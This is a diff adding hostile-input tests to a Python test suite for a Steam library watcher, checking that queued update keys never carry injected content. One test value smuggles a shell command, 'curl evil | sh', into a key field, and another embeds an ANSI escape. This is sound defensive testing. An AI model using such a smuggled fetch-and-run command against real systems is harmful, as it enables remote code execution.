@@ -234,6 +234,85 @@ with tempfile.TemporaryDirectory() as d:
     print("Steam watch test passed ✓")
 
 
+# --- what anything running as you could plant -----------------------------------------------------
+with tempfile.TemporaryDirectory() as d:
+    home = Path(d, "home")
+    root = home / ".local/share/Steam"
+    apps, cache = root / "steamapps", root / "depotcache"
+    apps.mkdir(parents=True)
+    cache.mkdir()
+    engine = make_engine(f"sqlite:///{d}/system.db")
+
+    # An ID that isn't in Ensign's form is never listed: the list goes into a
+    # command you may paste with sudo.
+    with Session(engine) as session:
+        session.add(SteamPending(key="update-1-2-3; curl evil | sh", kind="update", appid="1", detail="x"))
+        session.add(SteamPending(key="update-1-2-3\x1b[2J", kind="update", appid="1", detail="x"))
+        session.commit()
+    assert keys(engine) == [], keys(engine)
+
+    # Folder and app IDs in other scripts' digits ("١٢٣".isdigit() is True) are skipped.
+    odd = apps / "workshop" / "content" / "١٢٣" / "٤٥٦"
+    odd.mkdir(parents=True)
+    (odd / "x.exe").write_bytes(b"x")
+    (apps / "appmanifest_99.acf").write_text(acf("٩٩", "Odd", {"١": "٢"}))
+    steamwatch.watch(engine, home)
+    assert keys(engine) == [] and not any(not k.isascii() for k in keys(engine))
+    with Session(engine) as session:
+        assert session.query(SteamSnapshot).count() == 0
+
+    # No name in the appmanifest: no "rename" when one appears.
+    (apps / "appmanifest_99.acf").unlink()
+    (apps / "appmanifest_40.acf").write_text(acf("40", "", {"41": "1"}).replace('"name" ""', ""))
+    (cache / "41_1.manifest").write_bytes(manifest(41, {"a.exe": b"1"}))
+    steamwatch.watch(engine, home)
+    (apps / "appmanifest_40.acf").write_text(acf("40", "Named Later", {"41": "1"}))
+    steamwatch.watch(engine, home)
+    assert keys(engine, "rename") == [], keys(engine)
+
+    # A second library on a drive that isn't mounted: what was found there is kept.
+    other = Path(d, "drive")
+    (other / "steamapps").mkdir(parents=True)
+    (other / "depotcache").mkdir()
+    (apps / "libraryfolders.vdf").write_text(f'"libraryfolders" {{ "1" {{ "path" "{other}" }} }}')
+    (other / "steamapps" / "appmanifest_50.acf").write_text(acf("50", "Far Game", {"51": "1"}))
+    (other / "depotcache" / "51_1.manifest").write_bytes(manifest(51, {"g.exe": b"1"}))
+    steamwatch.watch(engine, home)
+    (other / "steamapps" / "appmanifest_50.acf").write_text(acf("50", "Far Game", {"51": "2"}))
+    (other / "depotcache" / "51_2.manifest").write_bytes(manifest(51, {"g.exe": b"1", "x.bat": b"2"}))
+    steamwatch.watch(engine, home)
+    assert keys(engine, "update") == ["update-50-51-2"], keys(engine)
+    (other / "steamapps").rename(other / "unmounted")
+    steamwatch.watch(engine, home)
+    assert keys(engine, "update") == ["update-50-51-2"], "a library that isn't there says nothing"
+    with Session(engine) as session:
+        assert session.query(SteamSnapshot).filter(SteamSnapshot.appid == "50").count() == 1
+    (other / "unmounted").rename(other / "steamapps")
+    (other / "steamapps" / "appmanifest_50.acf").unlink()
+    steamwatch.watch(engine, home)
+    assert keys(engine, "update") == [], "the library is back, and the game is gone"
+
+    # An item with more files than the cap: walking stops, across folders too.
+    big = apps / "workshop" / "content" / "60" / "61"
+    for i in range(6):
+        (big / f"d{i}").mkdir(parents=True)
+        (big / f"d{i}" / "f.txt").write_text("x")
+    (big / "zz").mkdir()
+    (big / "zz" / "late.exe").write_bytes(b"x")
+    saved, steamwatch._MAX_WALK = steamwatch._MAX_WALK, 3
+    try:
+        assert steamwatch._workshop_item(big) is None, "stopped before the last folder"
+    finally:
+        steamwatch._MAX_WALK = saved
+    assert steamwatch._workshop_item(big) is not None
+    engine.dispose()
+
+from ensign_scan.explanations import known_family  # noqa: E402
+
+assert known_family("Win.Trojan.Vidar-1\nInjected") is None and known_family("\n") is None
+print("hostile input test passed ✓")
+
+
 # --- protected mode: a decisions file from before this table ------------------------------------
 with tempfile.TemporaryDirectory() as d:
     decisions = Path(d, "decisions.db")
